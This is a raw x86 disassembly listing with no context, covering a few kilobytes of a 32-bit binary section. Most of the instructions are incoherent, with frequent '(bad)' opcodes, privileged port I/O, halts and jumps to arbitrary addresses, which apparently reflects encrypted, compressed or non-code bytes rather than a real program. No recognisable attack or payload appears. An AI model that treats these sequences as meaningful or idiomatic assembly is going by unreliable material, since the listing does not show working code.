  40aa30:	mov    bh,BYTE PTR [ebp-0x50327da2]
  40aa36:	xor    DWORD PTR [ebx-0x17c84b87],0x66e17b7b
  40aa40:	into   
  40aa41:	xchg   ebx,eax
  40aa42:	inc    ecx
  40aa43:	daa    
  40aa44:	not    DWORD PTR [esi+0x8ee3a69]
  40aa4a:	mov    eax,ds:0x6a21dfaf
  40aa4f:	ss dec eax
  40aa51:	sub    al,BYTE PTR [edi]
  40aa53:	stc    
  40aa54:	push   es
  40aa55:	pop    esp
  40aa56:	cmp    eax,0x57388a26
  40aa5b:	dec    DWORD PTR ds:0x323889df
  40aa61:	sbb    al,0x6a
  40aa63:	jle    0x40aa02
  40aa65:	rcr    BYTE PTR [esi+0x47],1
  40aa68:	scas   eax,DWORD PTR es:[edi]
  40aa69:	cmp    eax,0x964080a8
  40aa6e:	lahf   
  40aa6f:	outs   dx,DWORD PTR ds:[esi]
  40aa70:	lock mov esi,ebp
  40aa73:	sbb    DWORD PTR [esi+0x64],esp
  40aa76:	adc    ch,bh
  40aa78:	out    dx,eax
  40aa79:	stos   DWORD PTR es:[edi],eax
  40aa7a:	(bad)  
  40aa7b:	cmp    BYTE PTR [eax+edi*8],cl
  40aa7e:	push   ss
  40aa7f:	inc    eax
  40aa80:	imul   eax,esp,0x903ee000
  40aa86:	sbb    al,0x7b
  40aa88:	sub    bl,cl
  40aa8a:	aas    
  40aa8b:	cmp    edi,DWORD PTR [ecx+0x7e30f750]
  40aa91:	inc    ebx
  40aa92:	cmp    eax,DWORD PTR [edi-0x26e3811a]
  40aa98:	pop    ebx
  40aa99:	in     al,dx
  40aa9a:	fisubr DWORD PTR [edi+0x2d]
  40aa9d:	add    eax,0x518734a7
  40aaa2:	pop    DWORD PTR [esp+ebp*2+0x25]
  40aaa6:	in     eax,0xdb
  40aaa8:	out    dx,al
  40aaa9:	add    al,0x53
  40aaab:	inc    ebx
  40aaac:	scas   eax,DWORD PTR es:[edi]
  40aaad:	jp     0x40ab0b
  40aaaf:	addr16 enter 0x36fb,0x27
  40aab4:	pcmpeqb mm4,QWORD PTR fs:[edx]
  40aab8:	inc    edx
  40aab9:	xchg   ecx,eax
  40aaba:	or     edx,0xffffffef
  40aabd:	inc    ecx
  40aabe:	test   BYTE PTR [edx],bl
  40aac0:	loope  0x40ab26
  40aac2:	pop    ebp
  40aac3:	test   DWORD PTR [eax],eax
  40aac5:	mov    eax,DWORD PTR [edi-0xe]
  40aac8:	xor    eax,0x8b1c7875
  40aacd:	in     al,dx
  40aace:	and    DWORD PTR [edi-0x33a9f47d],edx
  40aad4:	retf   0xf48
  40aad7:	mov    BYTE PTR [ebp-0x6ea98b1b],bh
  40aadd:	shr    BYTE PTR [ebx-0x19b74a42],1
  40aae3:	push   ss
  40aae4:	pusha  
  40aae5:	mov    ecx,0x3b1cd08d
  40aaea:	jle    0x40aa94
  40aaec:	jmp    0x7f661e43
  40aaf1:	cmc    
  40aaf2:	sbb    DWORD PTR [edi+0x30],ebp
  40aaf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf6:	jb     0x40ab1d
  40aaf8:	into   
  40aaf9:	(bad)  
  40aafa:	jnp    0x40aabb
  40aafc:	hlt    
  40aafd:	sub    al,0xf8
  40aaff:	dec    ebx
  40ab00:	and    al,0xbc
  40ab02:	mov    ecx,0xeeeef51c
  40ab07:	mov    dh,0xa8
  40ab09:	jns    0x40ab4c
  40ab0b:	stc    
  40ab0c:	jo     0x40ab17
  40ab0e:	dec    edx
  40ab0f:	sbb    dl,BYTE PTR [eax-0x6cf480ee]
  40ab15:	and    dl,BYTE PTR [edi]
  40ab17:	hlt    
  40ab18:	and    DWORD PTR [ebp-0x2fe3bba4],ebx
  40ab1e:	sbb    DWORD PTR [ecx-0x48ca7bef],esi
  40ab24:	fcom   DWORD PTR [ecx+0x704be822]
  40ab2a:	cmc    
  40ab2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab2c:	sbb    ch,BYTE PTR [ebx+0x36]
  40ab2f:	sub    DWORD PTR [esi+0x69de0318],ecx
  40ab35:	xchg   BYTE PTR [edx-0x667ea4ff],al
  40ab3b:	sub    BYTE PTR [edx],cl
  40ab3d:	pop    esi
  40ab3e:	(bad)  
  40ab3f:	lahf   
  40ab40:	hlt    
  40ab41:	mov    edi,0x7e948ec2
  40ab46:	mov    dl,BYTE PTR [ebx]
  40ab48:	dec    eax
  40ab49:	adc    BYTE PTR [ebx],ah
  40ab4b:	mov    ebx,0x6cf9912b
  40ab50:	mov    BYTE PTR [edx+0x31],dl
  40ab53:	in     al,0x5e
  40ab55:	sbb    DWORD PTR [esi-0xd],edx
  40ab58:	inc    edi
  40ab59:	push   esp
  40ab5a:	fidivr DWORD PTR [eax-0x597a2c84]
  40ab60:	loope  0x40ab55
  40ab62:	imul   eax,esi,0x15dcb3eb
  40ab68:	add    al,0x8b
  40ab6a:	dec    sp
  40ab6c:	jge    0x40abe2
  40ab6e:	or     eax,DWORD PTR [esi-0x7082da6]
  40ab74:	ror    BYTE PTR [ecx+0x72e7b493],0x1b
  40ab7b:	(bad)  
  40ab7c:	shl    BYTE PTR ds:0xec366436,1
  40ab82:	mov    bh,0x17
  40ab84:	popf   
  40ab85:	iret   
  40ab86:	jle    0x40aba4
  40ab88:	mov    ebp,0x65f667b2
  40ab8d:	sub    ebx,DWORD PTR [ebx-0x32]
  40ab90:	adc    edi,ebx
  40ab92:	adc    bh,BYTE PTR [ebx+0x12]
  40ab95:	add    esp,eax
  40ab97:	jnp    0x40ab3d
  40ab99:	cli    
  40ab9a:	out    0x1f,al
  40ab9c:	outs   dx,DWORD PTR ds:[esi]
  40ab9d:	push   cs
  40ab9e:	(bad)  
  40ab9f:	repz inc eax
  40aba1:	sbb    al,0xc8
  40aba3:	test   al,0xc1
  40aba5:	cmc    
  40aba6:	aad    0xda
  40aba8:	jbe    0x40ac02
  40abaa:	mov    ebp,0x12360adc
  40abaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb0:	out    0xc5,al
  40abb2:	rcr    DWORD PTR [ecx],1
  40abb4:	hlt    
  40abb5:	aad    0x1e
  40abb7:	push   es
  40abb8:	push   esp
  40abb9:	je     0x40ab75
  40abbb:	out    0x46,eax
  40abbd:	mov    ch,dh
  40abbf:	mov    ecx,0xde77bd08
  40abc4:	mov    ch,0x17
  40abc6:	sub    esp,DWORD PTR [ebx+0x7f97322b]
  40abcc:	scas   al,BYTE PTR es:[edi]
  40abcd:	add    BYTE PTR [edi],0xc2
  40abd0:	mov    ch,0x99
  40abd2:	div    DWORD PTR [eax+0x5b196542]
  40abd8:	in     eax,0x5e
  40abda:	shr    al,cl
  40abdc:	fist   WORD PTR [ebx]
  40abde:	arpl   WORD PTR [ecx-0x9],cx
  40abe1:	lea    ebx,cs:[ebx]
  40abe4:	aad    0x26
  40abe6:	retf   
  40abe7:	fstp   QWORD PTR [eax+0x41]
  40abea:	pop    ds
  40abeb:	lods   eax,DWORD PTR ds:[esi]
  40abec:	mov    al,ds:0x154fd900
  40abf1:	test   BYTE PTR [eax],dl
  40abf3:	adc    esp,esp
  40abf5:	add    ecx,ebx
  40abf7:	sub    eax,0x81900831
  40abfc:	push   edx
  40abfd:	cs popa 
  40abff:	cli    
  40ac00:	and    eax,0xb17eb58a
  40ac05:	mov    ds:0xf618f603,al
  40ac0a:	jge    0x40abae
  40ac0c:	and    bh,BYTE PTR [eax-0x33a65d10]
  40ac12:	sub    ebx,DWORD PTR [edx+0x5d355de8]
  40ac18:	inc    ecx
  40ac19:	cmc    
  40ac1a:	mov    dh,0x2f
  40ac1c:	test   DWORD PTR [ecx+0x28],0x16a9611a
  40ac23:	dec    ebp
  40ac24:	and    BYTE PTR [edx-0x351dce91],dh
  40ac2a:	cmp    dh,0xf3
  40ac2d:	pop    ss
  40ac2e:	lods   al,BYTE PTR ds:[esi]
  40ac2f:	or     DWORD PTR [esi],eax
  40ac31:	xchg   ebx,eax
  40ac32:	mov    WORD PTR [edi],ds
  40ac34:	fdivr  DWORD PTR [edx]
  40ac36:	xchg   ebp,eax
  40ac37:	jmp    0xf2cce48
  40ac3c:	call   0x3bc7107f
  40ac41:	(bad)  
  40ac42:	adc    dh,ah
  40ac44:	inc    ebx
  40ac45:	push   0x22d39a4
  40ac4a:	add    DWORD PTR [ebx-0x60],edx
  40ac4d:	and    BYTE PTR [ebp+0x30f5133d],dh
  40ac53:	lods   eax,DWORD PTR ds:[esi]
  40ac54:	jne    0x40acd3
  40ac56:	idiv   esi
  40ac58:	adc    BYTE PTR [edi-0x677ee62a],dh
  40ac5e:	test   al,0x53
  40ac60:	push   cs
  40ac61:	and    eax,DWORD PTR [edx+0x208010c3]
  40ac67:	pop    edi
  40ac68:	js     0x40abea
  40ac6a:	mov    eax,0xfd525423
  40ac6f:	aad    0x8a
  40ac71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac72:	sbb    eax,0xf8f59632
  40ac77:	imul   edi,DWORD PTR [edi-0x509ad859],0x2d
  40ac7e:	xchg   esp,eax
  40ac7f:	(bad)  
  40ac80:	xor    ebp,ebx
  40ac82:	sub    eax,ebp
  40ac84:	lods   eax,DWORD PTR ds:[esi]
  40ac85:	in     eax,0xf3
  40ac87:	into   
  40ac88:	inc    ebp
  40ac89:	popa   
  40ac8a:	pusha  
  40ac8b:	out    dx,eax
  40ac8c:	scas   al,BYTE PTR es:[edi]
  40ac8d:	aad    0x0
  40ac8f:	xchg   edi,eax
  40ac90:	push   ebx
  40ac91:	bound  esi,QWORD PTR [edx-0x1de42ea8]
  40ac97:	fwait
  40ac98:	cmp    bl,dh
  40ac9a:	push   eax
  40ac9b:	inc    esi
  40ac9c:	mov    esp,0x290972a0
  40aca1:	pop    edx
  40aca2:	rcl    ch,0xa6
  40aca5:	outs   dx,DWORD PTR ds:[esi]
  40aca6:	iret   
  40aca7:	ror    BYTE PTR [ecx],0xb4
  40acaa:	retf   0xcc1
  40acad:	cmp    esp,esi
  40acaf:	rcl    BYTE PTR [esi+ecx*2-0x5d],1
  40acb3:	dec    edx
  40acb4:	in     al,dx
  40acb5:	jle    0x40ac4c
  40acb7:	sbb    eax,0x595b0af6
  40acbc:	dec    ecx
  40acbd:	fdiv   QWORD PTR [esi-0x9c73f5a]
  40acc3:	loope  0x40acbf
  40acc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acc6:	inc    esi
  40acc7:	(bad)  
  40acc8:	daa    
  40acc9:	jmp    0x40acab
  40accb:	in     al,dx
  40accc:	(bad)  
  40accd:	out    0x7,al
  40accf:	fidiv  WORD PTR [edi-0x80]
  40acd2:	jae    0x40ac62
  40acd4:	mov    ebx,esi
  40acd6:	scas   al,BYTE PTR es:[edi]
  40acd7:	clc    
  40acd8:	pop    esi
  40acd9:	repz mov WORD PTR [edi],fs
  40acdc:	pop    esp
  40acdd:	imul   esp,DWORD PTR [edx-0x4a],0xffffff89
  40ace1:	or     DWORD PTR [esi],edx
  40ace3:	iret   
  40ace4:	imul   edi,DWORD PTR [ebx+0x2edcc117],0x1b
  40aceb:	scas   al,BYTE PTR es:[edi]
  40acec:	sub    ecx,DWORD PTR [esi+ebx*1+0x1f8143a2]
  40acf3:	loopne 0x40acb6
  40acf5:	xchg   esi,eax
  40acf6:	popf   
  40acf7:	mov    WORD PTR [esi+0x4ea97d2b],ss
  40acfd:	stos   BYTE PTR es:[edi],al
  40acfe:	leave  
  40acff:	xor    dh,bl
  40ad01:	hlt    
  40ad02:	cmc    
  40ad03:	imul   edx,DWORD PTR [edx],0x3
  40ad06:	xchg   bl,bl
  40ad08:	inc    edx
  40ad09:	jae    0x40ad45
  40ad0b:	mov    ds:0xb0a54373,eax
  40ad10:	mov    al,ds:0x8d30f42e
  40ad15:	and    al,0x44
  40ad17:	adc    eax,0xcd47face
  40ad1c:	je     0x40ad0e
  40ad1e:	xchg   ecx,eax
  40ad1f:	mov    ds:0x794c042,eax
  40ad24:	ins    BYTE PTR es:[edi],dx
  40ad25:	test   eax,0x3d402f95
  40ad2a:	dec    edx
  40ad2b:	fnstsw WORD PTR [esi+edx*8+0x6e]
  40ad2f:	sbb    ch,dl
  40ad31:	sub    al,0x50
  40ad33:	(bad)  
  40ad34:	out    dx,al
  40ad35:	daa    
  40ad36:	int3   
  40ad37:	mov    edi,0xbfe5eaa2
  40ad3c:	jl     0x40ad57
  40ad3e:	cmp    eax,0x8104c634
  40ad43:	idiv   BYTE PTR [eax-0x2737dfd]
  40ad49:	push   esi
  40ad4a:	idiv   BYTE PTR [edi+0x66]
  40ad4d:	inc    ebp
  40ad4e:	cmp    bh,BYTE PTR [edx]
  40ad50:	jge    0x40acd9
  40ad52:	stos   DWORD PTR es:[edi],eax
  40ad53:	repz in al,dx
  40ad55:	cli    
  40ad56:	stos   DWORD PTR es:[edi],eax
  40ad57:	jb     0x40ad19
  40ad59:	loop   0x40ad41
  40ad5b:	and    ebx,DWORD PTR [ecx+0x57abee92]
  40ad61:	mov    ebp,0x8c4c68fb
  40ad66:	jmp    0x501d06c
  40ad6b:	sub    BYTE PTR [esi],ch
  40ad6d:	push   ss
  40ad6e:	call   0xa70:0xe061b2eb
  40ad75:	xchg   esp,eax
  40ad76:	(bad)  
  40ad77:	retf   0x1722
  40ad7a:	jmp    0x40ad8f
  40ad7c:	jnp    0x40ad50
  40ad7e:	sub    esp,DWORD PTR [edx-0x37]
  40ad81:	arpl   WORD PTR [eax-0x18],dx
  40ad84:	fistp  WORD PTR [ecx+ebx*2]
  40ad87:	push   0xacbfab61
  40ad8c:	add    DWORD PTR [ebp+0x5b2de2eb],0x6e
  40ad93:	sub    ecx,DWORD PTR [esi-0x8]
  40ad96:	pop    ebp
  40ad97:	or     al,0xe4
  40ad99:	add    edi,DWORD PTR [edx+ebx*8-0x19]
  40ad9d:	in     eax,dx
  40ad9e:	cs dec ebx
  40ada0:	ret    0x2808
  40ada3:	push   eax
  40ada4:	in     al,dx
  40ada5:	mov    BYTE PTR [edx-0x2b],bh
  40ada8:	and    DWORD PTR [ebx+0x1c],esi
  40adab:	test   BYTE PTR [ebp-0x7c44dc02],bl
  40adb1:	js     0x40ad57
  40adb3:	icebp  
  40adb4:	adc    BYTE PTR [edx],cl
  40adb6:	ficomp WORD PTR [ecx]
  40adb8:	or     eax,0x5107eb4c
  40adbd:	dec    esp
  40adbe:	test   eax,0xfd99c999
  40adc3:	inc    ebp
  40adc4:	or     eax,ebx
  40adc6:	daa    
  40adc7:	test   eax,0x4a346679
  40adcc:	add    edi,edi
  40adce:	popa   
  40adcf:	ds jb  0x40adec
  40add2:	push   edi
  40add3:	stc    
  40add4:	mov    cs,ecx
  40add6:	xchg   edi,eax
  40add7:	div    BYTE PTR [esi-0x1658907c]
  40addd:	push   esp
  40adde:	nop
  40addf:	mov    ah,0x30
  40ade1:	cli    
  40ade2:	cdq    
  40ade3:	mov    esp,0xe736a521
  40ade8:	mov    bh,0x3c
  40adea:	clc    
  40adeb:	fidiv  WORD PTR [ebx+ecx*2-0x3e]
  40adef:	sbb    esi,esp
  40adf1:	dec    ebx
  40adf2:	xchg   ecx,eax
  40adf3:	dec    esp
  40adf4:	xchg   DWORD PTR [ecx],edx
  40adf6:	aam    0x47
  40adf8:	aam    0xea
  40adfa:	sar    BYTE PTR [edx-0x123c22d3],cl
  40ae00:	push   ds
  40ae01:	std    
  40ae02:	xor    eax,DWORD PTR [ebx+ebx*2]
  40ae05:	cmp    al,0x4d
  40ae07:	push   esi
  40ae08:	cmp    dh,bh
  40ae0a:	fmul   DWORD PTR [edx+eax*4+0x5a]
  40ae0e:	aas    
  40ae0f:	xor    eax,0xf3f0b47a
  40ae14:	mov    BYTE PTR [ebp-0x48],ch
  40ae17:	mov    eax,ds:0x9eaf4bd
  40ae1c:	mov    ecx,0x64e4abfa
  40ae21:	xchg   DWORD PTR [ecx-0x1a],ebp
  40ae24:	ret    
  40ae25:	lock in eax,0xd8
  40ae28:	cmp    al,0x33
  40ae2a:	std    
  40ae2b:	adc    al,0xe7
  40ae2d:	mov    eax,0x63b39f2b
  40ae32:	mov    ecx,esi
  40ae34:	sub    ebp,DWORD PTR [eax]
  40ae36:	sub    DWORD PTR [ebx-0x4cdbfa39],esp
  40ae3c:	or     DWORD PTR [eax],ecx
  40ae3e:	and    eax,0x4e1c1298
  40ae43:	mov    esp,0xa22bcad8
  40ae48:	or     BYTE PTR [ebx],bl
  40ae4a:	stc    
  40ae4b:	xor    esp,DWORD PTR [edx-0x28e143eb]
  40ae51:	xchg   edi,eax
  40ae52:	gs push 0x2c
  40ae55:	enter  0xa7cc,0x9
  40ae59:	clc    
  40ae5a:	push   ss
  40ae5b:	dec    esi
  40ae5c:	add    ch,ch
  40ae5e:	jb     0x40aeb4
  40ae60:	xlat   BYTE PTR ds:[ebx]
  40ae61:	cld    
  40ae62:	test   eax,0xf516785
  40ae67:	out    dx,eax
  40ae68:	mov    ah,0x66
  40ae6a:	pop    ebx
  40ae6b:	adc    ah,al
  40ae6d:	in     eax,0xc9
  40ae6f:	sbb    ebx,DWORD PTR [edi+ecx*2-0x12]
  40ae73:	dec    eax
  40ae74:	push   esp
  40ae75:	xchg   ecx,eax
  40ae76:	out    dx,eax
  40ae77:	je     0x40ae0c
  40ae79:	inc    edi
  40ae7a:	pop    ecx
  40ae7b:	sub    ebp,DWORD PTR [ebp-0x5]
  40ae7e:	adc    al,0x99
  40ae80:	cwde   
  40ae81:	inc    edx
  40ae82:	and    al,0x8c
  40ae84:	dec    esp
  40ae85:	pop    esp
  40ae86:	jo     0x40ae7b
  40ae88:	enter  0xfeb0,0x33
  40ae8c:	stos   BYTE PTR es:[edi],al
  40ae8d:	test   DWORD PTR [eax+0x2035360],esp
  40ae93:	mov    ah,bl
  40ae95:	popa   
  40ae96:	dec    ebp
  40ae97:	pop    ds
  40ae98:	sbb    DWORD PTR ds:0xd74ea6c,0x5d
  40ae9f:	add    esp,DWORD PTR [eax-0x79d1d9f2]
  40aea5:	es cdq 
  40aea7:	fld    QWORD PTR [eax+0x174584b1]
  40aead:	add    al,0x7c
  40aeaf:	sub    eax,0x7333c80c
  40aeb4:	hlt    
  40aeb5:	leave  
  40aeb6:	nop
  40aeb7:	js     0x40af37
  40aeb9:	sub    BYTE PTR [ebx],dh
  40aebb:	test   eax,0x1122c00
  40aec0:	aad    0x46
  40aec2:	in     eax,dx
  40aec3:	pop    ebx
  40aec4:	inc    ebp
  40aec5:	sub    al,0x52
  40aec7:	xchg   ecx,eax
  40aec8:	loope  0x40aec4
  40aeca:	add    DWORD PTR [ebp+edx*8+0x35],ecx
  40aece:	xor    dh,BYTE PTR [edx]
  40aed0:	in     eax,dx
  40aed1:	fs xor eax,0x532387df
  40aed7:	gs daa 
  40aed9:	fisubr DWORD PTR [ebx+0x4]
  40aedc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aedd:	stos   DWORD PTR es:[edi],eax
  40aede:	and    DWORD PTR ds:0xcf1b69a0,edi
  40aee4:	(bad)  
  40aee5:	lahf   
  40aee6:	adc    DWORD PTR [ecx],0xc6d6e0cc
  40aeec:	jae    0x40aef5
  40aeee:	add    DWORD PTR [ecx-0x7d],0x9d939b3d
  40aef5:	xchg   esi,eax
  40aef6:	(bad)  
  40aef7:	out    dx,eax
  40aef8:	mov    ds:0xcc336c2c,al
  40aefd:	or     DWORD PTR [esi+edx*2-0x7dee6f0e],eax
  40af04:	mov    edx,0x5af43097
  40af09:	lds    esp,FWORD PTR [ebp+0x56]
  40af0c:	cmp    DWORD PTR [eax+0x37],esp
  40af0f:	mov    ebx,0xf621a4dc
  40af14:	ja     0x40aeef
  40af16:	push   ebp
  40af17:	cdq    
  40af18:	dec    ebp
  40af19:	sub    BYTE PTR [edx+ecx*2],dl
  40af1c:	cmp    eax,DWORD PTR [eax]
  40af1e:	pop    ebp
  40af1f:	int3   
  40af20:	stos   DWORD PTR es:[edi],eax
  40af21:	lahf   
  40af22:	fs and esi,ecx
  40af25:	aam    0x6a
  40af27:	fisubr DWORD PTR [edi+ebx*2+0x7acf75b1]
  40af2e:	(bad)  
  40af2f:	dec    ecx
  40af30:	popa   
  40af31:	xchg   esp,eax
  40af32:	or     bh,BYTE PTR [ebp+0x2c170583]
  40af38:	mov    esi,0x1787be47
  40af3d:	sbb    ecx,DWORD PTR [ebx]
  40af3f:	bound  eax,QWORD PTR [ebx]
  40af41:	mov    ss,WORD PTR [edx+0x67ef0e0e]
  40af47:	into   
  40af48:	je     0x40af97
  40af4a:	adc    BYTE PTR [ebx],dl
  40af4c:	dec    ebx
  40af4d:	pop    ebp
  40af4e:	sub    BYTE PTR [ebp+0x7e],dl
  40af51:	(bad)  
  40af52:	push   edx
  40af53:	jmp    0x40af68
  40af55:	popf   
  40af56:	push   eax
  40af57:	into   
  40af58:	ficom  DWORD PTR [ecx+ecx*4]
  40af5b:	test   al,0x80
  40af5d:	xchg   BYTE PTR [edi],al
  40af5f:	cmp    eax,edi
  40af61:	jge    0x40af3d
  40af63:	fadd   st,st(4)
  40af65:	out    0xe,al
  40af67:	dec    ecx
  40af68:	lahf   
  40af69:	(bad)  
  40af6a:	mov    ecx,0x580c9cf3
  40af6f:	push   ebx
  40af70:	pop    edi
  40af71:	sub    bl,bh
  40af73:	or     eax,0x4624ce01
  40af78:	xlat   BYTE PTR ds:[ebx]
  40af79:	iret   
  40af7a:	cld    
  40af7b:	sub    eax,0xd0c4b6a
  40af80:	add    ebx,ebp
  40af82:	daa    
  40af83:	das    
  40af84:	dec    esi
  40af85:	sub    edi,edx
  40af87:	inc    ebp
  40af88:	rol    dh,cl
  40af8a:	xchg   ebp,eax
  40af8b:	je     0x40af0f
  40af8d:	(bad)  
  40af8e:	aaa    
  40af8f:	adc    esp,0x7868f1b4
  40af95:	sbb    eax,0xfd7caaa
  40af9a:	call   0xacaa:0xd830e386
  40afa1:	xlat   BYTE PTR ds:[ebx]
  40afa2:	out    dx,al
  40afa3:	and    BYTE PTR [ebx+0x36],ah
  40afa6:	sub    ebp,DWORD PTR [edx-0x46]
  40afa9:	pop    ss
  40afaa:	pop    ss
  40afab:	and    DWORD PTR [esi+0x2594e54f],eax
  40afb1:	repnz test al,0x35
  40afb4:	push   0xce7f59a2
  40afb9:	es push esp
  40afbb:	fcom   QWORD PTR [ecx+0x6c]
  40afbe:	adc    bh,BYTE PTR [ecx-0x5ba0ccb3]
  40afc4:	test   BYTE PTR [edi+0x40],dh
  40afc7:	arpl   WORD PTR [edx+0x5],bx
  40afca:	mov    ss,WORD PTR ds:0x7fbde663
  40afd0:	add    eax,0x9f70c4ae
  40afd5:	sbb    cl,BYTE PTR [esi]
  40afd7:	std    
  40afd8:	push   eax
  40afd9:	adc    dl,BYTE PTR [esp+ebp*1]
  40afdc:	and    al,0x2e
  40afde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afdf:	gs and eax,0xf19b951a
  40afe5:	cmp    al,0xed
  40afe7:	mov    cl,0x7b
  40afe9:	(bad)  
  40afea:	stc    
  40afeb:	mov    bh,0x75
  40afed:	out    0x84,eax
  40afef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff0:	add    esp,DWORD PTR [eax]
  40aff2:	scas   al,BYTE PTR es:[edi]
  40aff3:	sbb    eax,0x89927427
  40aff8:	out    dx,al
  40aff9:	mov    al,ds:0x851fb19e
  40affe:	and    eax,0x66a72d6c
  40b003:	int3   
  40b004:	sbb    eax,0x8cc756f0
  40b009:	mov    es,edi
  40b00b:	clc    
  40b00c:	add    dh,BYTE PTR [eax-0x2e]
  40b00f:	jb     0x40af98
  40b011:	xchg   esi,eax
  40b012:	xchg   ebp,eax
  40b013:	xor    eax,0x84099670
  40b018:	loope  0x40b03b
  40b01a:	test   BYTE PTR [eax+0x533b20fa],cl
  40b020:	sbb    BYTE PTR [esi+0x1d],0x6a
  40b024:	mov    ds:0x99874b55,al
  40b029:	dec    edx
  40b02a:	call   0x1fe4f33
  40b02f:	ja     0x40afc6
  40b031:	xchg   esp,eax
  40b032:	dec    ecx
  40b033:	les    ebx,FWORD PTR [edi+0x19]
  40b036:	scas   eax,DWORD PTR es:[edi]
  40b037:	arpl   WORD PTR [ebp-0x1a0d6dc6],dx
  40b03d:	xchg   ah,bl
  40b03f:	fisttp DWORD PTR [ecx+edi*2-0x33e80438]
  40b046:	sahf   
  40b047:	xchg   DWORD PTR [ebx+0x41],ecx
  40b04a:	(bad)  
  40b04c:	fnstenv [eax]
  40b04e:	pop    esp
  40b04f:	vshufps xmm5,xmm1,XMMWORD PTR [ecx],0x4d
  40b054:	neg    DWORD PTR [edi-0x65e46c86]
  40b05a:	dec    eax
  40b05b:	sti    
  40b05c:	in     al,dx
  40b05d:	mov    eax,gs
  40b05f:	fidivr DWORD PTR [edx+0x58]
  40b062:	stc    
  40b063:	sub    eax,0x3fdcb26c
  40b068:	lds    edi,FWORD PTR [ebx+0x1b815d37]
  40b06e:	push   cs
  40b06f:	sahf   
  40b070:	(bad)  
  40b071:	lahf   
  40b072:	mov    edi,0x872efe31
  40b077:	jge    0x40b037
  40b079:	mov    ch,BYTE PTR [ebp+0x658159ee]
  40b07f:	add    BYTE PTR [edi+0x1c],0x57
  40b083:	dec    ebp
  40b084:	adc    esp,DWORD PTR [edi+0x635decf4]
  40b08a:	sbb    bl,BYTE PTR [esi]
  40b08c:	push   ss
  40b08d:	and    BYTE PTR [eax-0x72b30d81],ch
  40b093:	push   edi
  40b094:	jmp    0x93260430
  40b099:	sahf   
  40b09a:	jne    0x40b046
  40b09c:	out    0xe9,eax
  40b09e:	pop    esi
  40b09f:	jmp    0x40b0fc
  40b0a1:	sub    al,0x1
  40b0a3:	(bad)  
  40b0a4:	pop    edx
  40b0a5:	inc    ecx
  40b0a6:	push   ds
  40b0a7:	lds    ebp,FWORD PTR [ebx*4+0x437550a1]
  40b0ae:	push   edi
  40b0af:	cmp    ecx,ebp
  40b0b1:	push   0x45
  40b0b3:	mov    dl,BYTE PTR [edx]
  40b0b5:	sbb    dl,ch
  40b0b7:	inc    edx
  40b0b8:	dec    edx
  40b0b9:	neg    BYTE PTR [ebx-0x2c65fd07]
  40b0bf:	popa   
  40b0c0:	sbb    al,0xb0
  40b0c2:	fs (bad) 
  40b0c4:	jp     0x40b08a
  40b0c6:	mov    edx,DWORD PTR [ecx+0x43551c33]
  40b0cc:	add    al,0x84
  40b0ce:	(bad)  
  40b0cf:	lds    ecx,FWORD PTR [esi-0x3f]
  40b0d2:	aad    0x7b
  40b0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d5:	mul    dh
  40b0d7:	xchg   ebx,eax
  40b0d8:	(bad)  
  40b0d9:	jl     0x40b0fa
  40b0db:	adc    al,0x41
  40b0dd:	aad    0xb1
  40b0df:	inc    esi
  40b0e0:	stc    
  40b0e1:	jmp    0x40b0cb
  40b0e3:	sar    DWORD PTR [edx-0x280beb91],0x28
  40b0ea:	sbb    eax,0xdc564c0e
  40b0ef:	(bad)
  40b0f2:	dec    esi
  40b0f3:	push   cs
  40b0f4:	cwde   
  40b0f5:	or     bh,BYTE PTR [ebx]
  40b0f7:	mov    bh,0x3a
  40b0f9:	(bad)  
  40b0fa:	idiv   DWORD PTR [ebx+0x2a75d5d6]
  40b100:	xchg   esi,eax
  40b101:	adc    DWORD PTR [edi-0x19a71d7b],esi
  40b107:	xchg   esi,eax
  40b108:	loope  0x40b0a6
  40b10a:	lahf   
  40b10b:	mov    ds:0xd71ff2b8,eax
  40b110:	mov    ds:0x5fdc42a7,eax
  40b115:	mov    ds:0xb94666a4,eax
  40b11a:	aad    0xcf
  40b11c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b11e:	mov    bh,0x89
  40b120:	add    al,0x62
  40b122:	ds sbb al,0x23
  40b125:	dec    esi
  40b126:	push   esp
  40b127:	or     BYTE PTR [esi-0x2f],cl
  40b12a:	js     0x40b0de
  40b12c:	(bad)  
  40b12d:	js     0x40b0e7
  40b12f:	inc    edx
  40b130:	add    eax,0x9a5c6855
  40b135:	mov    cl,0xe6
  40b137:	cmp    BYTE PTR [ebx-0x2d],ch
  40b13a:	cmp    cl,dh
  40b13c:	mov    ds:0x96eeced3,al
  40b141:	jnp    0x40b0eb
  40b143:	iret   
  40b144:	xor    dl,BYTE PTR [ebx]
  40b146:	(bad)  
  40b147:	int    0x6
  40b149:	xor    BYTE PTR [ebx-0xf991459],al
  40b14f:	mov    esp,0x45ae95f0
  40b154:	jecxz  0x40b1c3
  40b156:	mov    edx,0xd316694e
  40b15b:	ret    0x11b
  40b15e:	int    0xb3
  40b160:	nop
  40b161:	jnp    0x40b0f1
  40b163:	(bad)  
  40b164:	jmp    0xb310:0x673bf707
  40b16b:	dec    edi
  40b16c:	push   cs
  40b16d:	loop   0x40b150
  40b16f:	pop    esp
  40b170:	pop    ebp
  40b171:	or     ebp,DWORD PTR [edx+0x15]
  40b174:	xor    BYTE PTR [edi-0x34],ah
  40b177:	ret    
  40b178:	(bad)  
  40b17a:	lock or BYTE PTR [eax],dh
  40b17d:	jp     0x40b180
  40b17f:	pusha  
  40b180:	sub    eax,DWORD PTR [ebx+0x2349e277]
  40b186:	add    al,BYTE PTR [ecx]
  40b188:	aam    0xb1
  40b18a:	pop    edx
  40b18b:	nop
  40b18c:	xor    eax,0xb9ca8a0
  40b191:	xchg   esp,eax
  40b192:	ret    0xb245
  40b195:	call   0xd548ced7
  40b19a:	sub    al,0x65
  40b19c:	(bad)  
  40b19e:	mov    edx,0xd0ecd86a
  40b1a3:	inc    esi
  40b1a4:	push   edi
  40b1a5:	sti    
